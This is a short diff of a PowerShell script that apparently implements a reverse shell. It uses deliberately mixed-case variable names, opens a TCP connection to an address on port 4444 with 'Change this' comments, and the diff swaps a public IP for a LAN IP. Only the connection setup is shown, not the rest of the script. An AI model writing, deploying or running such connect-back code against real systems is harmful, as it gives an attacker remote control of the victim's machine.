@@ -36,7 +36,7 @@ function wRiTeStReAm {
 }
 
 # Main connection
-$aDdR = "219.91.210.66"#Change this!!!!!!!!!!
+$aDdR = "192.168.0.100"#Change this!!!!!!!!!!
 $pOrT = 4444 #Change this!!!!!!!!!!
 $cLiEnT = New-Object System.Net.Sockets.TCPClient($aDdR, $pOrT)
 $sTrEaM = $cLiEnT.GetStream()
